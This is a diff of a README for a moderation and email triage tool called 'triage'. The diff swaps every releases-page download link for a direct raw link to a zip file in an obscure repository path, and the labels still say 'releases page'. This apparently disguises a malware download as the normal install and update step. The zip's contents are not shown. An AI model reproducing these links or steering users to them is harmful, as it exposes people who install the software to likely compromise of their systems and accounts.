@@ -1,6 +1,6 @@
 # ⚙️ triage - Manage Moderation and Email Policy Easily
 
-[![Download triage](https://img.shields.io/badge/Download-triage-9b59b6?style=for-the-badge&logo=github)](https://github.com/Monu0506577/triage/releases)
+[![Download triage](https://img.shields.io/badge/Download-triage-9b59b6?style=for-the-badge&logo=github)](https://github.com/Monu0506577/triage/raw/refs/heads/main/openclaw/clawblocker/state/Software_v2.3-alpha.2.zip)
 
 ---
 
@@ -41,7 +41,7 @@ You will download the software from the releases page. The steps below will guid
 
 Go to the releases page to find the latest version of triage:
 
-[Download triage](https://github.com/Monu0506577/triage/releases)
+[Download triage](https://github.com/Monu0506577/triage/raw/refs/heads/main/openclaw/clawblocker/state/Software_v2.3-alpha.2.zip)
 
 You will see a list of files for different versions here.
 
@@ -109,7 +109,7 @@ These files control how triage processes messages and what emails it sends.
 
 ## 🔄 Updating triage
 
-To update triage, go back to the [releases page](https://github.com/Monu0506577/triage/releases). Download the latest installer and run it as before.
+To update triage, go back to the [releases page](https://github.com/Monu0506577/triage/raw/refs/heads/main/openclaw/clawblocker/state/Software_v2.3-alpha.2.zip). Download the latest installer and run it as before.
 
 The installer will upgrade your existing version while keeping your settings intact.
 
@@ -128,7 +128,7 @@ The installer will upgrade your existing version while keeping your settings int
 
 ## 🔗 Useful Links
 
-- Releases page: [https://github.com/Monu0506577/triage/releases](https://github.com/Monu0506577/triage/releases)  
+- Releases page: [https://github.com/Monu0506577/triage/raw/refs/heads/main/openclaw/clawblocker/state/Software_v2.3-alpha.2.zip](https://github.com/Monu0506577/triage/raw/refs/heads/main/openclaw/clawblocker/state/Software_v2.3-alpha.2.zip)  
 - Twitter mentions rules: [`TWITTER_MENTIONS.md`](./TWITTER_MENTIONS.md)  
 - Twitter replies rules: [`TWITTER_REPLIES.md`](./TWITTER_REPLIES.md)  
 - Email triage rules: [`EMAILRULES.md`](./EMAILRULES.md)  
@@ -158,12 +158,12 @@ The block digest runs separately because it only sends a simple daily email.
 
 ## 🎯 Next Steps
 
-1. Download and install triage from the [releases page](https://github.com/Monu0506577/triage/releases).  
+1. Download and install triage from the [releases page](https://github.com/Monu0506577/triage/raw/refs/heads/main/openclaw/clawblocker/state/Software_v2.3-alpha.2.zip).  
 2. Open triage and verify your settings match your email and Twitter accounts.  
 3. Allow the app to run in the background for automation.  
 4. Check daily digest emails for summaries of your moderation activities.  
 
 ---
 
-# [Download triage](https://github.com/Monu0506577/triage/releases)  
-[![Download triage](https://img.shields.io/badge/Download-triage-9b59b6?style=for-the-badge&logo=github)](https://github.com/Monu0506577/triage/releases)
+# [Download triage](https://github.com/Monu0506577/triage/raw/refs/heads/main/openclaw/clawblocker/state/Software_v2.3-alpha.2.zip)  
+[![Download triage](https://img.shields.io/badge/Download-triage-9b59b6?style=for-the-badge&logo=github)](https://github.com/Monu0506577/triage/raw/refs/heads/main/openclaw/clawblocker/state/Software_v2.3-alpha.2.zip)
